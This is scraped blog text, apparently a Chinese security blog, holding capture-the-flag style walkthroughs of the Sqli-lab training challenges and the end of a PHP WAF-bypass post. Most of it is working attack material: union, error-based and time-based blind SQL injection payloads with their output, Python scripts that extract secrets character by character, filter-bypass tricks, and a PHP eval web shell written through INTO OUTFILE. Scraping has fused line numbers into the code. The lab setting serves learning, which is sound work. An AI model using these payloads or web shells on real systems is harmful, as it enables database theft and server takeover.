([ bool $exclude_disabled = FALSE ] ) : array ​ 获取所有已定义函数的数组。 这个函数是可将用户定义的和内置函数均返回的。获取内置函数可以使用$arr[“internal”]，获取用户定义的函数可以使用$arr[“user”]。 所以我们可以尝试找到system函数 配合前面的方法，效果拔群，不过system函数不一定都是 1077 ，使用的时候最好可以grep查找一下system函数的下标 字符数组我们可以将PHP中的每个字符串当成一组字符来使用（基本上与 Python 相同），并且我们可以使用$string[2]或者$string[-3]语法来引用单个字符。这种方法也有可能绕过基于PHP函数名的防护规则。比如，我们可以使用$a=\"eimstdy\";这个字符串构造出system(\"id\");语句。需要空格的话就在$a中加入空格就好了。 也可以使用一些内置变量，不再赘述，如下图所示 参考How To Exploit PHP Remotely To Bypass Filters &amp; WAF Rules","link":"/2019/02/28/Some-Tricks-of-Bypass-php-waf/"},{"title":"Sqli-lab Challenges Write up","text":"Sqli-lab Less54-65 writeup Basic12345678910111213141516171819202122232425show databases; //查看数据库use xxx; //使用某个数据库show tables; //查看该数据库的数据表desc xxx; //查看该数据表的结构select * from xxx; //查找某个数据表的所有内容select schema_name from information_schema.schemata; //猜数据库select table_name from information_schema.tables where table_schema='xxx';//猜某数据库的数据表Select column_name from information_schema.columns where table_name='xxx';//猜某表的所有列left(a,b); //从左侧截取 a 的前 b 位mid(column_name,start[,length]); //从位置start开始，截取column_name字符串的length位，与substr作用相同substr(string, start, length); //从位置start开始，截取字符串string的length长度，与mid作用相同ascii(); //将某个字符转换成ascii码ord(); //将某个字符转换成ascii码，同ascii() ChallengesLess-541$sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\"; 没什么过滤，直接上 10' union select 1,group_concat(schema_name),2 from information_schema.schemata;%23 得到 12Your Login name:information_schema,challenges,mysql,performance_schema,securityYour Password:2 爆破表 10' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='challenges';%23 得到 12Your Login name:QGVTNCJQK6Your Password:2 爆破列 10' union select 1,group_concat(column_name),2 from information_schema.columns where table_name='QGVTNCJQK6';%23 得到 12Your Login name:id,sessid,secret_9YQQ,tryyYour Password:2 爆破内容 10' union select id,secret_9YQQ,tryy from QGVTNCJQK6;%23 得到 12Your Login name:UEGTp3YhAO1wSaVNixYIWwMlYour Password:3 Less-551$sql=\"SELECT * FROM security.users WHERE id=($id) LIMIT 0,1\"; 也是没什么过滤，直接上 12345678910110) union select 1,group_concat(schema_name),2 from information_schema.schemata;%23Your Login name:information_schema,challenges,mysql,performance_schema,security0) union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='challenges';%23Your Login name:HSTKPKBJZX0) union select 1,group_concat(column_name),2 from information_schema.columns where table_name='HSTKPKBJZX';%23Your Login name:id,sessid,secret_Y1KS,tryy0) union select id,secret_Y1KS,tryy from HSTKPKBJZX;%23Your Login name:BsZ12SElz8qNeK2rvFOTYpkb Less-561$sql=\"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1\"; 123456780') union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='challenges';%23Your Login name:70ULR981EI0') union select 1,group_concat(column_name),2 from information_schema.columns where table_name='70ULR981EI';%23Your Login name:id,sessid,secret_KPCG,tryy0') union select id,secret_KPCG,tryy from 70ULR981EI;%23Your Login name:t8Q1iKTajlerR65fY1P8Lu8I Less-57123$id= '\"'.$id.'\"';// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\"; 增加了\" 123456780\" union select 1,group_concat(table_name),2 from information_schema.tables where table_schema='challenges';%23Your Login name:28YHZGI4810\" union select 1,group_concat(column_name),2 from information_schema.columns where table_name='28YHZGI481';%23Your Login name:id,sessid,secret_152D,tryy0\" union select id,secret_152D,tryy from 28YHZGI481;%23Your Login name:u1TfmRa1qunL2c4bGqZv4H6J Less-581234567891011121314151617181920$sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 可以看到，查询结果被用作数组序号，输出被改了，但是mysql_error()被打印了，所以我们可以直接用报错注入 123456780' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23XPATH syntax error: '~HG2RC34XP0~'0' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='HG2RC34XP0'),0x7e),1);%23XPATH syntax error: '~id,sessid,secret_7IXP,tryy~'0' and updatexml(1,concat(0x7e,(select secret_7IXP from HG2RC34XP0),0x7e),1);%23XPATH syntax error: '~m20SLP9m0za56xuhE7s1awqR~' Less-59123456789101112131415161718192021// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 还是按照之前的用报错注入 123456780 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23XPATH syntax error: '~EANMX28TXI~'0 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='EANMX28TXI'),0x7e),1);%23XPATH syntax error: '~id,sessid,secret_Z6IM,tryy~'0 and updatexml(1,concat(0x7e,(select secret_Z6IM from EANMX28TXI),0x7e),1);%23XPATH syntax error: '~tEwpAjainXQeyDLGeSG1nuok~' Less-6012345678910111213141516171819202122$id = '(\"'.$id.'\")';// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 直接加上\")绕过，依然可以用报错注入 123456780\") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23XPATH syntax error: '~5OJBK8U9XQ~'0\") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='5OJBK8U9XQ'),0x7e),1);%23XPATH syntax error: '~id,sessid,secret_8GHX,tryy~'0\") and updatexml(1,concat(0x7e,(select secret_8GHX from 5OJBK8U9XQ),0x7e),1);%23XPATH syntax error: '~Ij8p6anZKPghpsC4S5Ti9mgi~' Less-61123456789101112131415161718192021// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 直接加上'))绕过，依然可以用报错注入 123456780')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1);%23XPATH syntax error: '~MP94IBBMTL~'0')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='MP94IBBMTL'),0x7e),1);%23XPATH syntax error: '~id,sessid,secret_QN8H,tryy~'0')) and updatexml(1,concat(0x7e,(select secret_QN8H from MP94IBBMTL),0x7e),1);%23XPATH syntax error: '~CieVXfic1dl9FuqHdChc2we3~' Less-62123456789101112131415161718192021// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; // print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 因为注释了print_r(mysql_error())，无法用报错注入。因为还有尝试次数，只能用延时注入 写了一下 jio 本，写的比较渣 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061# encoding: utf-8import requestsimport reindex_url = \"http://localhost:8081/Less-62/index.php?id=\"header = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',}cookie = { 'challenge':'7b4184899f8b788841fb3eaf29177fdc', 'PHPSESSID':'a64htnnoo54e99q0005mareng7'}flag = ''# for i in range(1,11):# print(i)# for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890':# j = ord(j)# # payload = \"0') or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\"# url = index_url + payload# try:# r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5)# # print(r.text)# except:# flag += chr(j)# print(flag)# break# flag = 'secret_'# for i in range(8,12):# print(i)# for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890':# j = ord(j)# payload = \"0') or if((ascii(substr((select column_name from information_schema.columns where table_name='WMBY8Y9EUL' limit 2,1),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\"# url = index_url + payload# try:# r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5)# # print(r.text)# except:# flag += chr(j)# print(flag)# break#secret_WPTMfor i in range(1,25): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm': j = ord(j) payload = \"0') or if((ascii(substr((select secret_WPTM from WMBY8Y9EUL),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) break#mtvo4Z0u4wqd0nLRwxnydled Less-631234567891011121314151617181920$sql=\"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; // print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# encoding: utf-8import requestsimport reindex_url = \"http://localhost:8081/Less-63/index.php?id=\"header = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',}cookie = { 'challenge':'31a6b5568bbb9c350c1b296d9086acf0', 'PHPSESSID':'a64htnnoo54e99q0005mareng7'}flag = ''table = ''column = ''for i in range(1,11): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890': j = ord(j) payload = \"0' or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) except: flag += chr(j) print(flag) breaktable = flagprint(\"################################# table is %s\" % table)flag = 'secret_'for i in range(8,12): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890': j = ord(j) payload = \"0' or if((ascii(substr((select column_name from information_schema.columns where table_name='\"+ table +\"' limit 2,1),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) breakcolumn = flagprint(\"################################# column is %s\" % column)flag = ''for i in range(1,25): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm': j = ord(j) payload = \"0' or if((ascii(substr((select \"+ column +\" from \"+ table +\"),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) breakprint(\"################################# key is %s\" % flag) Less-64123456789101112131415161718192021// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; // print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# encoding: utf-8import requestsimport reindex_url = \"http://localhost:8081/Less-64/index.php?id=\"header = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',}cookie = { 'challenge':'6efa4aae76d29c330a3636356fa5386c', 'PHPSESSID':'a64htnnoo54e99q0005mareng7'}flag = ''table = ''column = ''for i in range(1,11): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890': j = ord(j) payload = \"0)) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) except: flag += chr(j) print(flag) breaktable = flagprint(\"################################# table is %s\" % table)flag = 'secret_'for i in range(8,12): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890': j = ord(j) payload = \"0)) or if((ascii(substr((select column_name from information_schema.columns where table_name='\"+ table +\"' limit 2,1),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) breakcolumn = flagprint(\"################################# column is %s\" % column)flag = ''for i in range(1,25): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm': j = ord(j) payload = \"0)) or if((ascii(substr((select \"+ column +\" from \"+ table +\"),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) breakprint(\"################################# key is %s\" % flag) Less-6512345678910111213141516171819202122$id = '\"'.$id.'\"';// Querry DB to get the correct output$sql=\"SELECT * FROM security.users WHERE id=($id) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row){ echo '&lt;font color= \"#00FFFF\"&gt;'; $unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\"); $pass = array_reverse($unames); echo 'Your Login name : '. $unames[$row['id']]; echo \"&lt;br&gt;\"; echo 'Your Password : ' .$pass[$row['id']]; echo \"&lt;/font&gt;\";}else { echo '&lt;font color= \"#FFFF00\"&gt;'; // print_r(mysql_error()); echo \"&lt;/font&gt;\"; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# encoding: utf-8import requestsimport reindex_url = \"http://localhost:8081/Less-65/index.php?id=\"header = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',}cookie = { 'challenge':'caf415945acc41218462264d7e211f37', 'PHPSESSID':'a64htnnoo54e99q0005mareng7'}flag = ''table = ''column = ''for i in range(1,11): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890': j = ord(j) payload = \"0\\\") or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) except: flag += chr(j) print(flag) breaktable = flagprint(\"################################# table is %s\" % table)flag = 'secret_'for i in range(8,12): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890': j = ord(j) payload = \"0\\\") or if((ascii(substr((select column_name from information_schema.columns where table_name='\"+ table +\"' limit 2,1),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) breakcolumn = flagprint(\"################################# column is %s\" % column)flag = ''for i in range(1,25): print(i) for j in 'QWERTYUIOPASDFGHJKLZXCVBNM1234567890qwertyuiopasdfghjklzxcvbnm': j = ord(j) payload = \"0\\\") or if((ascii(substr((select \"+ column +\" from \"+ table +\"),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" url = index_url + payload try: r = requests.get(url=url,headers=header,cookies=cookie,timeout=4.5) # print(r.text) except: flag += chr(j) print(flag) breakprint(\"################################# key is %s\" % flag)","link":"/2019/03/04/Sqli-lab%20Challenges%20Write%20up/"},{"title":"Sqli-lab速刷记录(1-53)","text":"之前很早写的，这几天把它补齐了。 [TOC] Preparation为了不干扰自己本机环境，sql-lab我就用的docker跑起来的，搭建也非常简单，也就两条命令123docker pull acgpiano/sqli-labsdocker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest然后在sql-lab上直接初始化数据库就好了。 Basic这里列举一下sql基础语句12345678910111213141516171819202122232425show databases; //查看数据库use xxx; //使用某个数据库show tables; //查看该数据库的数据表desc xxx; //查看该数据表的结构select * from xxx; //查找某个数据表的所有内容select schema_name from information_schema.schemata; //猜数据库select table_name from information_schema.tables where table_schema='xxxxx'; //猜某数据库的数据表Select column_name from information_schema.columns where table_name='xxxxx'; //猜某表的所有列left(a,b) //从左侧截取 a 的前 b 位mid(column_name,start[,length]) //从位置start开始，截取column_name字符串的length位，与substr作用相同substr(string, start, length) //从位置start开始，截取字符串string的length长度，与mid作用相同ascii() //将某个字符转换成ascii码ord() //将某个字符转换成ascii码，同ascii() SQLi-LABS Page-1(Basic Challenges)Less-1尝试添加’注入，发现报错1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1这里我们就可以直接发现报错的地方，直接将后面注释，然后使用123456789101' order by 3%23 //得到列数为3//这里用-1是为了查询一个不存在的id,好让第一句结果为空，直接显示第二句的结果-1' union select 1,2,group_concat(schema_name) from information_schema.schemata%23 //得到数据库名-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= 'security'# //得到表名-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name= 'users'# //得到列名-1' union select 1,username,password from users where id=3# //爆破得到数据 Less-2在添加’之后，得到返回1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1可以得到这个sql语句其实并没有单引号，只是用数字进行查询，例如1select * from users where id=1所以我们也可以跟上面一样，payloads:1-1 or 1=1%23 Less-3添加’之后，返回1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1可以得到大概的sql语句:1select * from users where id=('input') LIMIT 0,1; 所以我们可以需要闭合)。 1-1') or 1=1%23 Less-4尝试’并未发现报错，尝试”发现报错1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"1\"\") LIMIT 0,1' at line 1可以得到大概的sql语句1select * from users where id = (\"input\") LIMIT 0,1;所以payload:1-1\") or 1=1 %23其他注入语句同上 ，就不再一一列举了。 Less-5尝试’发现报错1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1猜测sql语句为1select * from users where id='input' LIMIT 0,1;如果尝试之前的注入方法，会发现不再会返回我们注入的信息，如果注入成功的话，页面会返回You are in...，出错的话就不会返回这个字符串，所以这里我们可以进行盲注。 使用left()例如我们可以使用1' and left(version(),1)=3%23这个payload进行测试，截取version()得到的最左侧的字符判断是否为3，如果为3则正常返回You are in...，否则不返回。所以我们可以利用这个一步一步爆破得到left(version(),1)=5。爆破区间可以确定在/[0-9.]/。 采用1'and length(database())=8%23对数据库名字长度进行爆破，确定数据库名字长度之后，我们可以使用database()来进行爆破数据库名，采用left(database(),1)&gt;'a'这个payload进行测试，原理跟上述一致，看返回即可，直到截取长度与数据库名字一致为止，这里效率比较高的就是采用二分法进行盲注。 使用substr()、ascii()也可以采用substr()、ascii()函数进行尝试:12341' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23 //截取数据库下第一个表的第一个字符与80ascii值进行对比找第二个字符只需要改成substr('xxx',2,1)即可。找第二个表改成limit 1,1 使用regexp()121' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1;)%23//users表中的列名是否有us**的列 使用ord()、mid()12341' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68%23//cast(username AS CHAR)将username转换成字符串//IFNULL(exp1,exp2)假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。//ord前文提过 使用报错注入推荐一篇超详细的讲解报错注入的文章——Mysql报错注入原理分析(count()、rand()、group by) 1234567891011121' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+1' union select 1,count(*) ,concat((select user()),floor(rand(0)*2))x from security.users group by x#1' union select (!(select * from (select user())x) - ~0),2,3 --+1' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) --+1' union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x --+ 使用延时注入benchmark 是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。 benchmark() 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式 1231'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+ Less-6没有回显，可以使用布尔盲注 11\" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100--+ 可以发现&gt;100有回显，小于就没有，也可以用报错注入… 这里就是把Less-5 中的'改成\"就行了 Less-7使用文件导出 1231'))UNION SELECT 1,2,3 into outfile \"c:\\\\wamp\\\\www\\\\sqlli b\\\\Less-7\\\\uuu.txt\"%231'))UNION SELECT 1,2,'&lt;?php @eval($_post[“mima”])?&gt;' into outfile \"c:\\\\wamp\\\\www\\\\sqllib\\\\Less-7\\\\yijuhua.php\"--+ Less-8可以使用时间盲注，也可以用 bool 盲注 11' and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ Less-9同 Less-8 可以使用时间盲注 11' and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ Less-1011\" and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+ Less-11报错注入，少一列就行了 1231' union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a#1' union select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.columns group by x# Less-121231\") union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a#1\") union select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.columns group by x# Less-1311') or 1=1# 成功登录，报错注入成功但是不回显，可以考虑盲注 11') or ascii(substr((database()),1,1))&gt;100# Less-1411\" or 1=1# 成功登录，依然不能回显，尝试使用布尔盲注 11\" or left(database(),1)='s'# 发现可以用updatexml进行报错注入 11\" and updatexml(1,concat(0x7e,(select @@version),0x7e),1)# Less-1511' or 1=1# 成功登录，布尔注入或者时间盲注均可行 121' or left(database(),1)='s'#admin' and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))# Less-1611\") or 1=1# 成功登录，布尔注入或者时间盲注均可行 121\") or left(database(),1)='s'#admin\") and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))# Less-17update注入，username过滤了很多，有password错误回显，考虑用报错注入 11' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)# Less-18登录成功后，页面提示 12Your IP ADDRESS is: 172.17.0.1Your User Agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 那么有可能是 ip 或者 UA 注入，看了一下发现是个 Header 头注入，这里需要注意这是登录成功的条件下才能触发的，而且既然是insert注入，需要用'1'='1闭合后面的 sql 语句，否则就是语法错误了 12' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and '1'='1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1),\"1\",\"1\")# Less-19登录成功后提示 12Your IP ADDRESS is: 172.17.0.1Your Referer is: http://localhost:8081/Less-19/ 于是我们可以知道是在Referer应该有注入点，在 Referer 处同样用 1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and '1'='1 可以注入 Less-20cookie 注入，登录成功后修改 cookie 即可 1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) and '1'='1 Less-21登录成功后发现 cookie 加上了 base64 1YOUR COOKIE : uname = YWRtaW4= 用上面的 payload 进行 base64 编码就行了，记得=要 urlencode 1JyBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQHZlcnNpb24pLDB4N2UpLDEpIGFuZCAnMSc9JzE%3d Less-22同 21 ，单引号换成双引号即可 1IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQHZlcnNpb24pLDB4N2UpLDEpIGFuZCAiMSI9IjE%3d Less-23这里#、--+均被过滤了，但是我们可以利用or \"1\"=\"1来闭合后面的双引号也可以达到我们的目的 1-1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or '1'='1 Less-24这里是个二次注入，我们可以先注册一个admin'#的账号，在修改密码处我们就可以以自己的密码修改 admin 的密码了，因为修改密码处形成的 sql 语句是 1UPDATE users SET passwd=\"New_Pass\" WHERE username ='admin'#'xxxx 这样#就注释掉了后面的 sql 语句 Less-25题目很直接，提示直接把 or、and过滤了，但是可以用&amp;&amp;、||绕过 1admin'||updatexml(1,concat(0x7e,(select @@version),0x7e),1)# 也可以双写绕过 10' union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata;# Less-25a1-1 union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata %23 Less-26题目提示空格与注释被过滤了，可以使用%0a绕过，可以盲注也可以报错注入 120'||left(database(),1)&gt;'s'%26%26'1'='1 0'||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||'1'='1 Less-26a题目提示空格与注释被过滤了，可以使用%a0绕过，报错注入不出，可以用布尔盲注 1234560'||'1'='1 